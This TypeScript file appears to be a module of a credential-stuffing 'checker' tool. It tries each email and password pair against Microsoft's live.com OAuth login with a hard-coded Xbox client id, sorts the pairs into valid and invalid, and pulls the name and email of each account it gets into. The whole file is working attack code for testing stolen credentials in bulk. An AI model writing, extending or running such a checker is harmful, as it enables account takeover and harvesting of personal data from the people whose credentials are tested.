import { BaseChecker } from './base';
import { CheckResult } from '@/types';

export class HotmailChecker extends BaseChecker {
  async check(email: string, password: string): Promise<CheckResult> {
    try {
      // Microsoft/Hotmail login endpoint
      const loginResponse = await this.client.post(
        'https://login.live.com/oauth20_token.srf',
        {
          grant_type: 'password',
          client_id: '00000000402b5328',
          scope: 'service::user.auth.xboxlive.com::MBI_SSL',
          username: email,
          password: password,
        },
        {
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
          },
        }
      );

      if (loginResponse.data?.access_token) {
        const capture = await this.getAccountDetails(loginResponse.data.access_token);
        return this.createResult(email, password, 'hotmail', 'valid', capture);
      }

      return this.createResult(email, password, 'hotmail', 'invalid');
    } catch (error: any) {
      return this.createResult(
        email,
        password,
        'hotmail',
        'error',
        undefined,
        error.message
      );
    }
  }

  private async getAccountDetails(accessToken: string) {
    try {
      const response = await this.client.get(
        'https://apis.live.net/v5.0/me',
        {
          headers: {
            Authorization: `Bearer ${accessToken}`,
          },
        }
      );

      return {
        username: response.data?.name,
        email: response.data?.emails?.account,
        emailVerified: true,
      };
    } catch {
      return {};
    }
  }
}
